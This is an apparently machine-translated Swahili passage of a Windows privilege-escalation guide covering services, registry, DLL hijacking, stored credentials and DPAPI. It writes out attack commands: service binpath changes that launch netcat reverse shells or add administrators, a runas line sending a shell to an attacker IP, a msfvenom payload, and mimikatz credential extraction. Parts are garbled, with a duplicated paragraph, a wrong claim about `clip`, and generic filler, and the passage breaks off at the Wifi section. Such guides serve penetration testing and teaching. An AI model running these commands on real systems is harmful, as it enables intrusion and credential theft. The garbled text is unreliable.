{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Makabrasha ya Nyumbani

Makabrasha ya nyumbani ni maeneo ambapo watumiaji wa mfumo wa Windows hufanya kazi na kuhifadhi faili zao za kibinafsi. Kila mtumiaji ana kabrasha lake la nyumbani ambalo linapatikana chini ya folda ya "C:\Users" kwa mfumo wa Windows 7 na "C:\Documents and Settings" kwa mfumo wa Windows XP.

Kwa kawaida, makabrasha ya nyumbani yana kinga ya usalama ili kuzuia upatikanaji usioidhinishwa. Hata hivyo, kuna njia kadhaa za kukiuka kinga hii na kupata ufikiaji wa kiwango cha juu kwenye mfumo.

Moja ya njia hizo ni kuchunguza faili za usanidi wa programu zinazotumiwa na watumiaji. Mara nyingi, faili hizi zina habari muhimu kama vile nywila zilizohifadhiwa kwa njia isiyofaa. Kwa kuchunguza faili hizi, unaweza kupata ufikiaji wa kiwango cha juu kwenye mfumo.

Njia nyingine ni kuchunguza faili za usanidi wa programu zinazotumiwa na watumiaji. Mara nyingi, faili hizi zina habari muhimu kama vile nywila zilizohifadhiwa kwa njia isiyofaa. Kwa kuchunguza faili hizi, unaweza kupata ufikiaji wa kiwango cha juu kwenye mfumo.

Kwa kumalizia, makabrasha ya nyumbani ni maeneo muhimu ya kuchunguza wakati wa kutekeleza mbinu za kuboresha ufikiaji wa kiwango cha juu kwenye mfumo wa Windows. Kwa kuchunguza faili za usanidi na kufanya uchunguzi wa kina, unaweza kupata habari muhimu na kukiuka kinga ya usalama ili kupata ufikiaji wa kiwango cha juu.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri

Kuna sera ya nenosiri ambayo inaweza kuwekwa kwenye mfumo wa Windows ili kuimarisha usalama. Sera hii inahusisha vigezo na mahitaji ambayo lazima yafuatwe wakati wa kuunda na kutumia nywila kwenye mfumo.

Sera ya nenosiri inaweza kujumuisha mambo kama vile urefu wa neno la siri, matumizi ya herufi kubwa na ndogo, nambari, na alama maalum. Pia inaweza kuweka kikomo cha muda wa kubadilisha nywila na kuzuia matumizi ya nywila zilizotumiwa hapo awali.

Kwa kuweka sera ya nenosiri yenye nguvu, unaweza kuzuia mashambulizi ya kubadilisha nywila na kuongeza usalama wa mfumo wako wa Windows. Ni muhimu kuhakikisha kuwa sera hii inatekelezwa na kufuatwa na watumiaji wote wa mfumo.
```bash
net accounts
```
### Pata maudhui ya ubao wa kunakili

Kuna njia kadhaa za kupata maudhui ya ubao wa kunakili kwenye mfumo wa Windows. Hapa kuna njia mbili za kufanya hivyo:

1. Kutumia programu ya PowerShell:
   - Fungua PowerShell kama msimamizi.
   - Tumia amri ifuatayo: `Get-Clipboard`.
   - Maudhui ya ubao wa kunakili yataonyeshwa kwenye dirisha la PowerShell.

2. Kutumia programu ya Command Prompt:
   - Fungua Command Prompt kama msimamizi.
   - Tumia amri ifuatayo: `clip`.
   - Maudhui ya ubao wa kunakili yatapelekwa kwenye dirisha la Command Prompt.

Kwa njia hizi, unaweza kupata maudhui ya ubao wa kunakili kwenye mfumo wa Windows.
```bash
powershell -command "Get-Clipboard"
```
## Kukimbia Mchakato

### Ruhusa za Faili na Folda

Kwanza kabisa, orodhesha mchakato **angalia nywila ndani ya mstari wa amri ya mchakato**.\
Angalia ikiwa unaweza **kubadilisha faili ya kukimbia** au ikiwa una ruhusa ya kuandika kwenye folda ya faili ili kutumia [mashambulizi ya **DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Hakikisha daima kuna [**wadukuzi wa electron/cef/chromium** inayofanya kazi, unaweza kuitumia kwa kuboresha mamlaka](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za faili za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za mchakato wa faili za binary (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa Nywila za Kumbukumbu

Unaweza kuunda kumbukumbu ya kumbukumbu ya mchakato unaofanya kazi kwa kutumia **procdump** kutoka kwa sysinternals. Huduma kama FTP zina **nywila wazi katika kumbukumbu**, jaribu kuchimba kumbukumbu na kusoma nywila.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazofanya kazi kama SYSTEM zinaweza kuruhusu mtumiaji kuzindua CMD, au kuvinjari folda.**

Mfano: "Msaada na Usaidizi wa Windows" (Windows + F1), tafuta "amri ya amri", bonyeza "Bonyeza ili kufungua Amri ya Amri"

## Huduma

Pata orodha ya huduma:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Vibali

Unaweza kutumia **sc** kupata habari za huduma
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na faili ya binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia ikiwa "Watumiaji waliothibitishwa" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Kuwezesha huduma

Ikiwa una kosa hili (kwa mfano na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanza, au kwa sababu imelemazwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusiana nayo._

Unaweza kuwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tafadhali kumbuka kuwa huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kuzunguka** tatizo hili ni kwa kukimbia:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya faili ya huduma**

Katika hali ambapo kikundi cha "Watumiaji waliothibitishwa" kinamiliki **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha njia ya faili ya huduma. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha tena huduma

Ili kuanzisha tena huduma, unaweza kutumia amri ifuatayo:

```bash
net stop <huduma>
net start <huduma>
```

Badilisha `<huduma>` na jina la huduma unayotaka kuanzisha tena. Kwa mfano, ikiwa unataka kuanzisha tena huduma ya "Print Spooler", unaweza kutumia amri zifuatazo:

```bash
net stop Spooler
net start Spooler
```

Hii itasababisha huduma kusimamishwa kwanza na kisha kuanzishwa tena.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uwezo unaweza kuongezeka kupitia idhini mbalimbali:
- **SERVICE_CHANGE_CONFIG**: Inaruhusu upya mipangilio ya faili ya huduma.
- **WRITE_DAC**: Inawezesha upya idhini, hivyo kuwezesha kubadilisha mipangilio ya huduma.
- **WRITE_OWNER**: Inaruhusu umiliki na upya idhini.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha mipangilio ya huduma.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha mipangilio ya huduma.

Kwa ajili ya kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Idhini dhaifu za faili za huduma

**Angalia kama unaweza kubadilisha faili inayotekelezwa na huduma** au kama una **idhini ya kuandika kwenye folda** ambapo faili inapatikana ([**DLL Hijacking**](dll-hijacking.md))**.**\
Unaweza kupata kila faili inayotekelezwa na huduma kwa kutumia **wmic** (siyo katika system32) na angalia idhini zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Huduma za mabadiliko ya ruhusa ya usajili

Unapaswa kuhakiki ikiwa unaweza kubadilisha usajili wa huduma yoyote.\
Unaweza **kuchunguza** ruhusa zako za **kubadilisha** usajili wa huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuhakikiwa ikiwa **Watumiaji waliothibitishwa** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, faili ya kutekelezwa na huduma inaweza kubadilishwa.

Kubadilisha Njia ya faili ya kutekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Huduma za Usajili wa AppendData/AddSubdirectory

Ikiwa una ruhusa hii juu ya usajili, inamaanisha **unaweza kuunda usajili wa chini kutoka kwa huu**. Katika kesi ya huduma za Windows hii ni **ya kutosha kutekeleza nambari ya aina yoyote:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Njia za Huduma Zisizo na Alama

Ikiwa njia ya faili ya kutekelezwa haijatambulishwa kwa alama, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa njia ya _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizo na nukuu, isipokuwa zile zinazomilikiwa na huduma za kujengwa za Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu na metasploit: `exploit/windows/local/trusted\_service\_path`
Unaweza kuunda faili ya huduma kwa mkono na metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Kurejesha

Windows inaruhusu watumiaji kuweka hatua za kuchukuliwa ikiwa huduma inashindwa. Kipengele hiki kinaweza kusanidiwa kuashiria kwa faili ya binary. Ikiwa faili hii ya binary inaweza kubadilishwa, inawezekana kufanya upandishaji wa haki za mtumiaji. Maelezo zaidi yanaweza kupatikana katika [hati rasmi](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Programu

### Programu Zilizosakinishwa

Angalia **ruhusa za faili za binary** (labda unaweza kubadilisha moja na kupandisha haki za mtumiaji) na **folda** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kubadilisha faili ya usanidi ili kusoma faili maalum au ikiwa unaweza kubadilisha faili ya binary ambayo itatekelezwa na akaunti ya Msimamizi (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Kukimbia wakati wa kuanza

**Angalia kama unaweza kubadilisha usajili au faili ya binary ambayo itatekelezwa na mtumiaji tofauti.**\
**Soma** **ukurasa ufuatao** ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **kupandisha haki za mtumiaji kwa kutumia autoruns**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Madereva

Tafuta **madereva ya tatu yasiyo ya kawaida/hatarishi**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Ikiwa una **ruhusa ya kuandika ndani ya folda iliyopo kwenye PATH**, unaweza kuweza kuteka DLL iliyopakiwa na mchakato na **kuongeza mamlaka**.

Angalia ruhusa za folda zote zilizopo kwenye PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa habari zaidi kuhusu jinsi ya kutumia hii angalia:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Mtandao

### Kugawana
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Faili la wenyeji

Angalia kompyuta nyingine zinazojulikana zilizowekwa kwa nguvu kwenye faili ya wenyeji
```
type C:\Windows\System32\drivers\etc\hosts
```
### Vifaa vya Mtandao na DNS

#### Network Interfaces (Vifaa vya Mtandao)

Vifaa vya mtandao ni sehemu muhimu ya mazingira ya mtandao. Wanaruhusu kompyuta kuwasiliana na mtandao na kubadilishana data. Kuna aina tofauti za vifaa vya mtandao, kama vile kadi za mtandao, modemu, na router.

Kadi za mtandao ni vifaa ambavyo hushughulikia uhusiano wa kimwili kati ya kompyuta na mtandao. Wanawezesha kompyuta kuunganishwa na mtandao kupitia waya au teknolojia ya wireless.

Modemu ni kifaa kinachotumiwa kuunganisha kompyuta na mtandao wa kampuni ya huduma ya mtandao (ISP). Inabadilisha ishara za dijiti kutoka kwa kompyuta kuwa ishara za analog ambazo zinaweza kusafiri kupitia mtandao.

Routers ni vifaa ambavyo husambaza trafiki ya mtandao kati ya vifaa vya mtandao. Wanaruhusu kompyuta kuwasiliana na vifaa vingine kwenye mtandao na kusambaza data kwa usahihi.

#### DNS (Domain Name System)

DNS ni mfumo unaotumiwa kutafsiri majina ya kikoa kuwa anwani za IP. Anwani za IP ni nambari zinazotumiwa kwa kila kifaa kwenye mtandao ili kuwasiliana na vifaa vingine. DNS inaruhusu watumiaji kutumia majina ya kikoa kama "www.example.com" badala ya kujua anwani ya IP ya kifaa kinachohusika.

Mfumo wa DNS una seva za DNS ambazo hushughulikia ombi la kutafsiri jina la kikoa. Seva hizi zinahifadhi rekodi za DNS ambazo zinaonyesha uhusiano kati ya majina ya kikoa na anwani za IP. Wakati mtumiaji anapoomba kutafsiri jina la kikoa, kompyuta yake inawasiliana na seva ya DNS ili kupata anwani ya IP inayohusiana na jina la kikoa.

Kwa mfano, wakati unapoingia "www.example.com" kwenye kivinjari chako, kivinjari kinawasiliana na seva ya DNS ili kupata anwani ya IP ya "www.example.com". Mara tu anwani ya IP inapopatikana, kivinjari kinaweza kuwasiliana moja kwa moja na kifaa kinachohusika kwenye mtandao.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia huduma **zilizozuiwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Utekelezaji

Jedwali la utekelezaji ni orodha ya maelekezo ambayo kompyuta hutumia kuamua njia bora ya kusafirisha data kati ya mitandao tofauti. Kila maelekezo katika jedwali la utekelezaji lina habari kuhusu anwani ya IP ya marudio, anwani ya IP ya lango, na kifaa cha mtandao kinachotumiwa kusafirisha data.

Kwa kawaida, kompyuta ina jedwali la utekelezaji la ndani ambalo linajumuisha maelekezo ya msingi ya kusafirisha data kwenye mtandao wa ndani. Hata hivyo, inaweza pia kuwa na jedwali la utekelezaji la nje ambalo linajumuisha maelekezo ya kusafirisha data kwenye mitandao ya nje.

Kwa mfano, ikiwa kompyuta inataka kusafirisha data kwa anwani ya IP ya marudio, itatafuta maelekezo katika jedwali la utekelezaji ili kuamua njia bora ya kufikia marudio hayo. Ikiwa maelekezo yanapatikana, kompyuta itatumia lango lililoorodheshwa katika maelekezo hayo kusafirisha data.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Orodha ya ARP

ARP (Address Resolution Protocol) ni itifaki inayotumiwa kwenye mitandao ya kompyuta kubadilishana anwani za IP na anwani za MAC. Orodha ya ARP ina habari kuhusu uhusiano kati ya anwani za IP na anwani za MAC kwenye mtandao.

Kwa kawaida, kifaa kinapowasiliana na kifaa kingine kwenye mtandao, kinahitaji anwani ya MAC ya kifaa hicho ili kuwasiliana nayo. Kifaa kinachotaka kuwasiliana na kifaa kingine kinatafuta anwani ya MAC kwenye orodha ya ARP. Ikiwa anwani ya MAC haipo kwenye orodha ya ARP, kifaa kinatumia ARP kugundua anwani ya MAC ya kifaa kingine.

Orodha ya ARP inaweza kuwa muhimu kwa mchakato wa kuboresha uwezo wa kifaa cha kudukua. Kwa kudukua orodha ya ARP, mtu anaweza kubadilisha habari kwenye orodha hiyo ili kufanya mashambulizi ya kudukua.

Kwa hiyo, ni muhimu kwa wataalamu wa usalama wa mtandao kufahamu jinsi ya kusoma na kudukua orodha ya ARP ili kuzuia mashambulizi ya kudukua.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Mipangilio ya Firewall

[**Angalia ukurasa huu kwa amri za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodha ya mipangilio, kuunda mipangilio, kuzima, kuzima...)**

Zaidi [amri za uchunguzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata mtumiaji wa mizizi, unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa Vitambulisho / Hazina ya Windows

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Hazina ya Windows inahifadhi vitambulisho vya mtumiaji kwa seva, tovuti, na programu nyingine ambazo **Windows** inaweza **kuingia kiotomatiki** kwa niaba ya watumiaji. Kwa mara ya kwanza, inaweza kuonekana kama watumiaji wanaweza kuhifadhi vitambulisho vyao vya Facebook, vitambulisho vya Twitter, vitambulisho vya Gmail, nk., ili waweze kuingia kiotomatiki kupitia vivinjari. Lakini sivyo ilivyo.

Hazina ya Windows inahifadhi vitambulisho ambavyo Windows inaweza kuingia kiotomatiki kwa niaba ya watumiaji, ambayo inamaanisha kwamba **programu yoyote ya Windows inayohitaji vitambulisho kufikia rasilimali** (seva au tovuti) **inaweza kutumia Meneja wa Vitambulisho** na Hazina ya Windows na kutumia vitambulisho vilivyotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.

Isipokuwa programu zinashirikiana na Meneja wa Vitambulisho, sidhani kuwa ni rahisi kwao kutumia vitambulisho kwa rasilimali iliyotolewa. Kwa hivyo, ikiwa programu yako inataka kutumia hazina, inapaswa somehow **kuwasiliana na meneja wa vitambulisho na kuomba vitambulisho kwa rasilimali hiyo** kutoka kwenye hazina ya uhifadhi ya chaguo-msingi.

Tumia `cmdkey` kuorodhesha vitambulisho vilivyohifadhiwa kwenye kifaa.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia vibali vilivyohifadhiwa. Mfano ufuatao unaita faili ya mbali kupitia sehemu ya SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya sifa zilizotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Tafadhali kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), au kutoka [Moduli ya Powershells ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kusimbwa data kwa kutumia njia ya kusimbwa kwa usawa, inayotumiwa sana ndani ya mfumo wa uendeshaji wa Windows kwa kusimbwa kwa usawa wa funguo za kibinafsi zisizo sawa. Kusimbwa huku kunatumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa kwenye entropy.

**DPAPI inawezesha kusimbwa kwa funguo kupitia funguo za usawa zinazotokana na siri za kuingia za mtumiaji**. Katika mazingira yanayohusisha kusimbwa kwa mfumo, inatumia siri za uwakilishi wa kikoa cha mfumo.

Funguo za RSA za mtumiaji zilizosimbwa, kwa kutumia DPAPI, zimehifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security\_Identifier) cha mtumiaji. **Funguo la DPAPI, lililoshirikishwa na funguo kuu linalolinda funguo za kibinafsi za mtumiaji kwenye faili ile ile**, kwa kawaida linaundwa na data ya kubahatisha ya bajeti 64. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umefungwa, kuzuia orodha ya maudhui yake kupitia amri ya `dir` kwenye CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` na hoja sahihi (`/pvk` au `/rpc`) ili kuidondoa.

Faili za **vyeti zilizolindwa na nenosiri kuu** kawaida zipo katika:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia moduli ya **mimikatz** `dpapi::cred` na `/masterkey` sahihi ili kufichua.\
Unaweza **kuchukua DPAPI nyingi** za **masterkeys** kutoka **kumbukumbu** kwa kutumia moduli ya `sekurlsa::dpapi` (ikiwa wewe ni mtumiaji mkuu).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** mara nyingi hutumiwa kwa **scripting** na kazi za otomatiki kama njia ya kuhifadhi vitambulisho vilivyofichwa kwa urahisi. Vitambulisho hivyo vinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha kuwa vinaweza kufichuliwa tu na mtumiaji huyo huyo kwenye kompyuta hiyo hiyo ambayo viliumbwa.

Ili **kufichua** vitambulisho vya PS kutoka kwenye faili inayovihifadhi, unaweza kufanya yafuatayo:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

#### Introduction

Wifi is a wireless technology that allows devices to connect to the internet or other networks without the need for physical cables. It is commonly used in homes, offices, and public places to provide internet access to multiple devices simultaneously.

#### How Wifi Works

Wifi works by using radio waves to transmit data between devices. A wireless router acts as the central hub, transmitting and receiving data from connected devices. When a device wants to connect to a wifi network, it sends a request to the router, which then authenticates the device and assigns it an IP address. Once connected, the device can send and receive data over the network.

#### Wifi Security

Wifi networks can be secured using various security protocols, such as WEP, WPA, and WPA2. These protocols encrypt the data being transmitted over the network, making it difficult for unauthorized users to intercept and access the data. It is important to use strong passwords and regularly update the wifi network's security settings to protect against potential security breaches.

#### Common Wifi Attacks

Despite the security measures in place, wifi networks can still be vulnerable to various attacks. Some common wifi attacks include:

